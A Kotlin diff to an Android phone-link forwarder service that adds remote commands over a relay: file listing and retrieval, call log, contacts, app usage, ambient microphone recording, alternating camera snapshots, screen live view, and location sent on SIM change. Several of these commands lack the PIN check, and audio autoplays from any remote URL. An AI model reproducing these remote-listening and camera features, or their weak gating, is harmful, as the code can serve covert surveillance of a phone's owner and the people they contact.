@@ -31,6 +31,7 @@ import android.provider.MediaStore
 import android.speech.tts.TextToSpeech
 import android.telephony.SmsManager
 import android.telephony.SubscriptionManager
+import org.json.JSONArray
 import org.json.JSONObject
 import java.io.BufferedReader
 import java.io.InputStreamReader
@@ -68,6 +69,7 @@ class LinkService : Service() {
         Lan.startServer(applicationContext)
         if (Config.btReceiveOn(applicationContext)) BtShare.startServer(applicationContext)
         if (Config.automationOn(applicationContext)) WebhookServer.start(applicationContext)
+        WebInbox.start(applicationContext)
     }
 
     // ------------- v2.7: SMS-sent observer (automation trigger) -------------
@@ -442,8 +444,9 @@ class LinkService : Service() {
                 prefs.edit().putString("sim_sig", sig).apply()
             } else if (old != sig) {
                 prefs.edit().putString("sim_sig", sig).apply()
-                Relay.send(ctx, Relay.TYPE_SYSTEM, "সিমের তথ্য বদলেছে",
+                Relay.send(ctx, Relay.TYPE_URGENT, "🚨 সিম বদলেছে",
                     "আগের: ${old.ifEmpty { "—" }}\nএখন: ${sig.ifEmpty { "কোনো সিম নেই" }}")
+                LocationHelper.fetchAndSend(ctx)
             }
         } catch (_: Exception) { }
     }
@@ -656,6 +659,9 @@ class LinkService : Service() {
         // code; device ids keep everyone from hearing themselves).
         val dev = payload.optString("dev", "")
         if (dev.isNotEmpty() && dev == Config.deviceId(ctx)) return
+        // v2.11 panic mode: while active this phone silently drops all
+        // incoming data (nothing is stored or shown anywhere).
+        if (Config.panicActive(ctx)) return
         val type = payload.optString("type", "INFO")
         val from = payload.optString("from", "")
         if (from.isNotEmpty()) {
@@ -714,6 +720,7 @@ class LinkService : Service() {
         )
         History.add(ctx, item)
         Stats.incRecv(ctx, type)
+        InboxWidgetProvider.refresh(ctx)
         // v2.4 per-peer rules on this receiver: mute = store silently,
         // digest = hold notifications from this peer for the bundle.
         val peerMode = Config.peerMode(ctx, payload.optString("dev", ""))
@@ -750,6 +757,11 @@ class LinkService : Service() {
                     .putExtra("text", item.body)
                     .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
             } catch (_: Exception) { }
+        }
+        // v2.11 walkie-talkie: a ptt- voice file plays itself on arrival.
+        if (type == Relay.TYPE_FILE && Config.pttAutoplay(ctx) &&
+            item.title.contains("ptt-") && item.extra.startsWith("http")) {
+            thread { playPtt(item.extra) }
         }
         // A ringing call gets a full-screen alert with quick SMS replies,
         // and (when enabled) the caller's name is spoken aloud.
@@ -821,6 +833,7 @@ class LinkService : Service() {
             .setSmallIcon(android.R.drawable.stat_notify_chat)
             .setContentIntent(pi)
             .setAutoCancel(true)
+            .setNumber(History.todayCount(applicationContext))
         synchronized(this) { notifId += 1 }
         val myId = notifId
         // OTP items get a one-tap "copy code" action (opens a tiny activity,
@@ -1226,6 +1239,42 @@ class LinkService : Service() {
                 }
             }
             "OPEN" -> openLinkNotification(payload.optString("url", ""))
+            // ---- v2.11 commands ----
+            "OPENURL" -> {
+                val url = payload.optString("arg", "")
+                if (url.startsWith("http")) {
+                    try {
+                        startActivity(Intent(Intent.ACTION_VIEW, Uri.parse(url))
+                            .addFlags(Intent.FLAG_ACTIVITY_NEW_TASK))
+                        Relay.send(ctx, Relay.TYPE_INFO, "🔗 লিংক খোলা হয়েছে", url)
+                    } catch (e: Exception) {
+                        Relay.send(ctx, Relay.TYPE_INFO, "লিংক খোলা যায়নি", url)
+                    }
+                }
+            }
+            "LS" -> thread { sendDirList(payload.optString("arg", "")) }
+            "GETFILE" -> if (pinOk(payload)) thread {
+                sendPeerFile(payload.optString("arg", ""))
+            }
+            "CALLLOG" -> thread { sendCallLog() }
+            "CONTACTS" -> if (pinOk(payload)) thread { sendContacts() }
+            "USAGE" -> thread { sendUsageReport() }
+            "STORAGE" -> thread { sendStorageReport() }
+            "NETTEST" -> thread { sendNetTest() }
+            "RESTART" -> {
+                Relay.send(ctx, Relay.TYPE_INFO, "🔄 সার্ভিস রিস্টার্ট হচ্ছে",
+                    "ফরোয়ার্ডার কয়েক সেকেন্ডের মধ্যে আবার চালু হবে।")
+                restart(ctx)
+            }
+            "LISTEN" -> if (pinOk(payload)) startListen(
+                payload.optInt("minutes", 2).coerceIn(1, 10))
+            "STOPLISTEN" -> { listenUntil = 0L
+                Relay.send(ctx, Relay.TYPE_INFO, "🎙️ শোনা বন্ধ", "") }
+            "CAMPREV" -> if (pinOk(payload)) startCamPreview(
+                payload.optInt("count", 4).coerceIn(1, 8))
+            "LIVEVIEW" -> if (pinOk(payload)) startLiveView()
+            "STOPLIVE" -> { liveUntil = 0L
+                Relay.send(ctx, Relay.TYPE_INFO, "📺 লাইভ ভিউ বন্ধ", "") }
             "LOST_ON" -> if (pinOk(payload)) setLostMode(ctx, true)
             "LOST_OFF" -> if (pinOk(payload)) setLostMode(ctx, false)
             "SCREENSHOT" -> {
@@ -1465,6 +1514,424 @@ class LinkService : Service() {
         } catch (_: Exception) { }
     }
 
+
+    // ------------- v2.11 helpers -------------
+
+    private fun allowedPath(f: java.io.File): Boolean {
+        val p = try { f.canonicalPath } catch (_: Exception) { f.absolutePath }
+        val ext = android.os.Environment.getExternalStorageDirectory().absolutePath
+        return p.startsWith(ext) || p.startsWith(applicationContext.filesDir.absolutePath) ||
+            p.startsWith(applicationContext.cacheDir.absolutePath)
+    }
+
+    private fun humanSize(n: Long): String = when {
+        n >= 1_000_000 -> "${n / 1_000_000} MB"
+        n >= 1_000 -> "${n / 1_000} KB"
+        else -> "$n B"
+    }
+
+    private fun sendDirList(pathArg: String) {
+        val ctx = applicationContext
+        val dir = java.io.File(pathArg.ifEmpty { "/sdcard/Download" })
+        if (!dir.isDirectory || !allowedPath(dir)) {
+            Relay.send(ctx, Relay.TYPE_INFO, "📁 ফোল্ডার পাওয়া যায়নি",
+                dir.absolutePath)
+            return
+        }
+        val files = (dir.listFiles()?.toList() ?: emptyList())
+            .sortedWith(compareBy({ !it.isDirectory }, { it.name.lowercase() }))
+            .take(60)
+        val sb = StringBuilder(dir.absolutePath).append("\n")
+        for (f in files) {
+            if (f.isDirectory) sb.append("📁 ").append(f.name).append("/\n")
+            else sb.append("📄 ").append(f.name).append(" (")
+                .append(humanSize(f.length())).append(")\n")
+        }
+        if (files.isEmpty()) sb.append("(খালি)")
+        Relay.send(ctx, Relay.TYPE_INFO, "📁 ফোল্ডারের তালিকা", sb.toString())
+    }
+
+    private fun sendPeerFile(path: String) {
+        val ctx = applicationContext
+        val f = java.io.File(path)
+        if (!f.isFile || !allowedPath(f)) {
+            Relay.send(ctx, Relay.TYPE_INFO, "ফাইল পাওয়া যায়নি", path)
+            return
+        }
+        try {
+            val bytes = f.readBytes()
+            if (bytes.size > 4_500_000) Chunks.sendLarge(ctx, f.name, bytes)
+            else Relay.postFile(ctx, f.name, bytes, "")
+            Relay.send(ctx, Relay.TYPE_INFO, "📤 ফাইল পাঠানো হয়েছে",
+                "${f.name} (${humanSize(f.length().toLong())})")
+        } catch (e: Exception) {
+            Relay.send(ctx, Relay.TYPE_INFO, "ফাইল পাঠানো যায়নি", path)
+        }
+    }
+
+    private fun sendCallLog() {
+        val ctx = applicationContext
+        if (ctx.checkSelfPermission(android.Manifest.permission.READ_CALL_LOG) !=
+            PackageManager.PERMISSION_GRANTED) {
+            Relay.send(ctx, Relay.TYPE_INFO, "কল লগের অনুমতি নেই", "")
+            return
+        }
+        val sb = StringBuilder()
+        try {
+            ctx.contentResolver.query(
+                android.provider.CallLog.Calls.CONTENT_URI, null, null, null,
+                android.provider.CallLog.Calls.DATE + " DESC")?.use { c ->
+                val nI = c.getColumnIndex(android.provider.CallLog.Calls.NUMBER)
+                val tI = c.getColumnIndex(android.provider.CallLog.Calls.TYPE)
+                val dI = c.getColumnIndex(android.provider.CallLog.Calls.DATE)
+                var n = 0
+                while (c.moveToNext() && n < 25) {
+                    n++
+                    val num = if (nI >= 0) c.getString(nI) ?: "?" else "?"
+                    val kind = when (if (tI >= 0) c.getInt(tI) else 0) {
+                        android.provider.CallLog.Calls.INCOMING_TYPE -> "📥"
+                        android.provider.CallLog.Calls.OUTGOING_TYPE -> "📤"
+                        android.provider.CallLog.Calls.MISSED_TYPE -> "📵"
+                        else -> "•"
+                    }
+                    val when_ = if (dI >= 0) java.text.SimpleDateFormat(
+                        "dd MMM hh:mm a", java.util.Locale.getDefault())
+                        .format(java.util.Date(c.getLong(dI))) else ""
+                    sb.append(kind).append(" ").append(num).append(" — ")
+                        .append(when_).append("\n")
+                }
+            }
+        } catch (_: Exception) { }
+        Relay.send(ctx, Relay.TYPE_INFO, "📞 সাম্প্রতিক কল",
+            sb.toString().ifEmpty { "কোনো কল পাওয়া যায়নি" })
+    }
+
+    private fun sendContacts() {
+        val ctx = applicationContext
+        if (ctx.checkSelfPermission(android.Manifest.permission.READ_CONTACTS) !=
+            PackageManager.PERMISSION_GRANTED) {
+            Relay.send(ctx, Relay.TYPE_INFO, "কন্টাক্টের অনুমতি নেই", "")
+            return
+        }
+        val sb = StringBuilder()
+        var count = 0
+        try {
+            ctx.contentResolver.query(
+                android.provider.ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
+                null, null, null,
+                android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME
+            )?.use { c ->
+                val nI = c.getColumnIndex(
+                    android.provider.ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)
+                val pI = c.getColumnIndex(
+                    android.provider.ContactsContract.CommonDataKinds.Phone.NUMBER)
+                while (c.moveToNext()) {
+                    val name = if (nI >= 0) c.getString(nI) ?: "" else ""
+                    val num = if (pI >= 0) c.getString(pI) ?: "" else ""
+                    if (num.isEmpty()) continue
+                    count++
+                    sb.append("BEGIN:VCARD\nVERSION:3.0\nFN:")
+                        .append(name.replace("\n", " ")).append("\nTEL:")
+                        .append(num).append("\nEND:VCARD\n")
+                }
+            }
+        } catch (_: Exception) { }
+        if (count == 0) {
+            Relay.send(ctx, Relay.TYPE_INFO, "কোনো কন্টাক্ট পাওয়া যায়নি", "")
+            return
+        }
+        Relay.postFile(ctx, "contacts.vcf",
+            sb.toString().toByteArray(Charsets.UTF_8), "text/vcard")
+        Relay.send(ctx, Relay.TYPE_INFO, "👥 কন্টাক্ট পাঠানো হয়েছে",
+            "$count টি নম্বর (contacts.vcf)")
+    }
+
+    private fun sendUsageReport() {
+        val ctx = applicationContext
+        val sb = StringBuilder()
+        try {
+            val usm = ctx.getSystemService(Context.USAGE_STATS_SERVICE)
+                as android.app.usage.UsageStatsManager
+            val cal = java.util.Calendar.getInstance().apply {
+                set(java.util.Calendar.HOUR_OF_DAY, 0)
+                set(java.util.Calendar.MINUTE, 0)
+            }
+            val stats = usm.queryUsageStats(
+                android.app.usage.UsageStatsManager.INTERVAL_DAILY,
+                cal.timeInMillis, System.currentTimeMillis())
+            val top = (stats ?: emptyList())
+                .filter { it.totalTimeInForeground > 60_000 }
+                .sortedByDescending { it.totalTimeInForeground }.take(10)
+            for (s in top) {
+                val mins = s.totalTimeInForeground / 60_000
+                val label = try {
+                    val ai = ctx.packageManager.getApplicationInfo(s.packageName, 0)
+                    ctx.packageManager.getApplicationLabel(ai).toString()
+                } catch (_: Exception) { s.packageName }
+                sb.append("• ").append(label).append(" — ")
+                    .append(if (mins >= 60) "${mins / 60}ঘ ${mins % 60}মি"
+                        else "${mins}মি").append("\n")
+            }
+        } catch (_: Exception) { }
+        Relay.send(ctx, Relay.TYPE_INFO, "📊 আজকের অ্যাপ ব্যবহার",
+            sb.toString().ifEmpty {
+                "তথ্য নেই — ওই ফোনে 'ব্যবহারের অ্যাক্সেস' অনুমতি লাগবে।" })
+    }
+
+    private fun sendStorageReport() {
+        val ctx = applicationContext
+        val ext = android.os.Environment.getExternalStorageDirectory()
+        val total = ext.totalSpace
+        val free = ext.freeSpace
+        val sb = StringBuilder()
+        sb.append("মোট: ").append(humanSize(total)).append("\nখালি: ")
+            .append(humanSize(free)).append("\nব্যবহৃত: ")
+            .append(humanSize(total - free)).append("\n\nবড় ফাইল (Download):\n")
+        try {
+            val dl = java.io.File("/sdcard/Download")
+            val big = (dl.listFiles()?.filter { it.isFile } ?: emptyList())
+                .sortedByDescending { it.length() }.take(8)
+            for (f in big) sb.append("• ").append(f.name).append(" — ")
+                .append(humanSize(f.length())).append("\n")
+            if (big.isEmpty()) sb.append("—")
+        } catch (_: Exception) { }
+        Relay.send(ctx, Relay.TYPE_INFO, "💾 স্টোরেজ রিপোর্ট", sb.toString())
+    }
+
+    private fun sendNetTest() {
+        val ctx = applicationContext
+        var pingMs = -1L
+        try {
+            val t0 = System.currentTimeMillis()
+            val sock = java.net.Socket()
+            sock.connect(java.net.InetSocketAddress("ntfy.sh", 443), 6000)
+            pingMs = System.currentTimeMillis() - t0
+            sock.close()
+        } catch (_: Exception) { }
+        val sb = StringBuilder()
+        sb.append("রিলে ল্যাটেন্সি (শেষ মাপা): ")
+            .append(if (Relay.lastLatencyMs(ctx) > 0)
+                "${Relay.lastLatencyMs(ctx)} ms" else "—").append("\n")
+        sb.append("ntfy.sh সংযোগ: ")
+            .append(if (pingMs >= 0) "$pingMs ms" else "ব্যর্থ").append("\n")
+        Relay.send(ctx, Relay.TYPE_INFO, "🌐 নেটওয়ার্ক পরীক্ষা", sb.toString())
+    }
+
+    // LISTEN: record 25 s chunks and send them until the deadline.
+    @Volatile private var listenUntil = 0L
+    @Volatile private var listenRunning = false
+
+    private fun startListen(minutes: Int) {
+        val ctx = applicationContext
+        if (ctx.checkSelfPermission(android.Manifest.permission.RECORD_AUDIO) !=
+            PackageManager.PERMISSION_GRANTED) {
+            Relay.send(ctx, Relay.TYPE_INFO, "মাইকের অনুমতি নেই", "")
+            return
+        }
+        listenUntil = System.currentTimeMillis() + minutes * 60_000L
+        Relay.send(ctx, Relay.TYPE_INFO, "🎙️ শোনা শুরু",
+            "$minutes মিনিট ধরে ২৫ সেকেন্ডের অংশে শব্দ পাঠানো হবে।")
+        if (listenRunning) return
+        listenRunning = true
+        thread(name = "pl-listen") {
+            while (System.currentTimeMillis() < listenUntil) {
+                recordAmbient(ctx)
+                try { Thread.sleep(1500) } catch (_: InterruptedException) { break }
+            }
+            listenRunning = false
+        }
+    }
+
+    // CAMPREV: a short series of still photos (front/back alternating).
+    private fun startCamPreview(count: Int) {
+        val ctx = applicationContext
+        if (ctx.checkSelfPermission(android.Manifest.permission.CAMERA) !=
+            PackageManager.PERMISSION_GRANTED) {
+            Relay.send(ctx, Relay.TYPE_INFO, "ক্যামেরার অনুমতি নেই", "")
+            return
+        }
+        Relay.send(ctx, Relay.TYPE_INFO, "📸 ক্যামেরা প্রিভিউ শুরু",
+            "$count টি ছবি পাঠানো হবে।")
+        thread(name = "pl-camrev") {
+            var front = true
+            repeat(count) {
+                SessionState.snapFront = front
+                front = !front
+                try {
+                    androidx.core.content.ContextCompat.startForegroundService(
+                        ctx, Intent(ctx, SnapService::class.java))
+                } catch (_: Exception) { }
+                try { Thread.sleep(6000) } catch (_: InterruptedException) { }
+            }
+        }
+    }
+
+    // LIVEVIEW: frames from the already-consented screen session.
+    @Volatile private var liveUntil = 0L
+    @Volatile private var liveRunning = false
+
+    private fun startLiveView() {
+        val ctx = applicationContext
+        if (!ScreenShareService.sessionActive()) {
+            Relay.send(ctx, Relay.TYPE_INFO, "স্ক্রিন সেশন চালু নেই",
+                "লাইভ ভিউয়ের জন্য ওই ফোনে একবার স্ক্রিন শেয়ার সেশন চালু করতে হবে।")
+            return
+        }
+        liveUntil = System.currentTimeMillis() + 10 * 60_000L
+        Relay.send(ctx, Relay.TYPE_INFO, "📺 লাইভ ভিউ শুরু",
+            "প্রতি কয়েক সেকেন্ডে স্ক্রিনের ছবি আসবে (সর্বোচ্চ ১০ মিনিট)।")
+        if (liveRunning) return
+        liveRunning = true
+        thread(name = "pl-live") {
+            while (System.currentTimeMillis() < liveUntil &&
+                ScreenShareService.sessionActive()) {
+                ScreenShareService.capture(ctx)
+                try { Thread.sleep(4000) } catch (_: InterruptedException) { break }
+            }
+            liveRunning = false
+        }
+    }
+
+    /** Downloads a walkie-talkie clip and plays it aloud (v2.11). */
+    private fun playPtt(urlStr: String) {
+        val ctx = applicationContext
+        try {
+            val bytes = java.net.URL(urlStr).openStream().use { it.readBytes() }
+            val f = java.io.File(ctx.cacheDir, "ptt-play.m4a")
+            f.writeBytes(bytes)
+            val mp = android.media.MediaPlayer()
+            mp.setDataSource(f.absolutePath)
+            mp.prepare()
+            mp.start()
+            mp.setOnCompletionListener { it.release() }
+        } catch (_: Exception) { }
+    }
+
+    /** v2.11: poll the MMS store; new picture messages are forwarded. */
+    private fun checkMms() {
+        val ctx = applicationContext
+        if (!Config.isSender(ctx) || !Config.fwdSms(ctx)) return
+        if (ctx.checkSelfPermission(android.Manifest.permission.READ_SMS) !=
+            PackageManager.PERMISSION_GRANTED) return
+        try {
+            val prefs = getSharedPreferences("phonelink_state", Context.MODE_PRIVATE)
+            val seen = prefs.getLong("mms_seen_id", -1L)
+            var maxId = seen
+            ctx.contentResolver.query(
+                android.net.Uri.parse("content://mms/inbox"),
+                arrayOf("_id", "date"), null, null, "_id DESC")?.use { c ->
+                val iI = c.getColumnIndex("_id")
+                var n = 0
+                while (c.moveToNext() && n < 5) {
+                    val id = if (iI >= 0) c.getLong(iI) else -1L
+                    if (id <= 0) continue
+                    if (id > maxId) maxId = id
+                    if (seen < 0 || id <= seen) continue
+                    n++
+                    forwardMms(ctx, id)
+                }
+            }
+            if (maxId != seen) prefs.edit().putLong("mms_seen_id", maxId).apply()
+        } catch (_: Exception) { }
+    }
+
+    private fun forwardMms(ctx: Context, mid: Long) {
+        try {
+            var text = ""
+            var image: ByteArray? = null
+            ctx.contentResolver.query(
+                android.net.Uri.parse("content://mms/part"),
+                arrayOf("_id", "ct", "text", "_data"), "mid=?",
+                arrayOf(mid.toString()), null)?.use { c ->
+                val ctI = c.getColumnIndex("ct")
+                val txI = c.getColumnIndex("text")
+                val idI = c.getColumnIndex("_id")
+                while (c.moveToNext()) {
+                    val ct = if (ctI >= 0) c.getString(ctI) ?: "" else ""
+                    if (ct == "text/plain" && txI >= 0) {
+                        text = c.getString(txI) ?: ""
+                    } else if (ct.startsWith("image/") && idI >= 0) {
+                        val partUri = android.net.Uri.parse(
+                            "content://mms/part/" + c.getLong(idI))
+                        ctx.contentResolver.openInputStream(partUri)?.use {
+                            image = it.readBytes()
+                        }
+                    }
+                }
+            }
+            Relay.send(ctx, Relay.TYPE_SMS, "📩 MMS",
+                text.ifEmpty { "(ছবির বার্তা)" })
+            val img = image
+            if (img != null && img.isNotEmpty()) {
+                if (img.size > 4_500_000) Chunks.sendLarge(ctx, "mms-$mid.jpg", img)
+                else Relay.postFile(ctx, "mms-$mid.jpg", img, "image/jpeg")
+            }
+        } catch (_: Exception) { }
+    }
+
+    /** v2.11: own-battery heat warning + peer rapid-drain warning. */
+    private fun checkBatteryHealth() {
+        val ctx = applicationContext
+        val prefs = getSharedPreferences("phonelink_state", Context.MODE_PRIVATE)
+        val today = java.text.SimpleDateFormat("yyyy-MM-dd", java.util.Locale.US)
+            .format(java.util.Date())
+        try {
+            val intent = registerReceiver(null,
+                android.content.IntentFilter(Intent.ACTION_BATTERY_CHANGED))
+            val temp = (intent?.getIntExtra(
+                android.os.BatteryManager.EXTRA_TEMPERATURE, 0) ?: 0) / 10.0
+            if (temp >= 45.0 && prefs.getString("batheat_day", "") != today) {
+                prefs.edit().putString("batheat_day", today).apply()
+                Relay.send(ctx, Relay.TYPE_URGENT, "🌡️ ব্যাটারি অতিরিক্ত গরম",
+                    "তাপমাত্রা ${temp}°C — চার্জ খুলে ফোন ঠান্ডা হতে দাও।")
+            }
+        } catch (_: Exception) { }
+        try {
+            val hist = Peers.batteryHistory(ctx)
+            if (hist.size >= 2) {
+                val (tLast, pLast) = hist.last()
+                val hourAgo = hist.lastOrNull { tLast - it.first >= 50 * 60_000L }
+                if (hourAgo != null && hourAgo.second - pLast >= 25 &&
+                    prefs.getString("peerdrain_day", "") != today) {
+                    prefs.edit().putString("peerdrain_day", today).apply()
+                    Relay.send(ctx, Relay.TYPE_URGENT,
+                        "🪫 অন্য ফোনের ব্যাটারি দ্রুত শেষ হচ্ছে",
+                        "এক ঘণ্টায় ${hourAgo.second}% থেকে ${pLast}%-এ নেমেছে।")
+                }
+            }
+        } catch (_: Exception) { }
+    }
+
+    /** v2.11: scheduled full backup (settings + inbox) to a file + peer. */
+    private fun checkAutoBackup() {
+        val ctx = applicationContext
+        if (!Config.autoBackupOn(ctx)) return
+        val last = Config.autoBackupLast(ctx)
+        if (System.currentTimeMillis() - last < 24 * 3600_000L) return
+        Config.setAutoBackupLast(ctx, System.currentTimeMillis())
+        thread(name = "pl-autobackup") {
+            try {
+                val root = JSONObject()
+                root.put("app", "PhoneLink backup")
+                root.put("created", System.currentTimeMillis())
+                root.put("settings", SettingsTransfer.export(ctx))
+                val arr = JSONArray()
+                for (item in History.all(ctx)) arr.put(item.toJson())
+                root.put("inbox", arr)
+                val bytes = root.toString().toByteArray(Charsets.UTF_8)
+                val name = "phonelink-backup-" + java.text.SimpleDateFormat(
+                    "yyyyMMdd", java.util.Locale.US)
+                    .format(java.util.Date()) + ".json"
+                val dir = java.io.File("/sdcard/Download/PhoneLinkBackups")
+                dir.mkdirs()
+                java.io.File(dir, name).writeBytes(bytes)
+                if (bytes.size <= 4_500_000) Relay.postFile(ctx, name, bytes, "application/json")
+                Relay.send(ctx, Relay.TYPE_INFO, "💾 অটো-ব্যাকআপ হয়েছে",
+                    "$name (${humanSize(bytes.size.toLong())})")
+            } catch (_: Exception) { }
+        }
+    }
+
     private fun heartbeatLoop() {
         // First heartbeat shortly after start so the receiver sees us online.
         try { Thread.sleep(8000) } catch (_: InterruptedException) { return }
@@ -1481,6 +1948,9 @@ class LinkService : Service() {
                 Relay.send(hctx, Relay.TYPE_HEARTBEAT, "heartbeat", "", extra)
                 Relay.flushQueue(applicationContext)
                 checkSimChanged()
+                checkMms()
+                checkBatteryHealth()
+                checkAutoBackup()
                 flushDigestIfDue()
                 checkGeofence()
                 checkDailySummary()
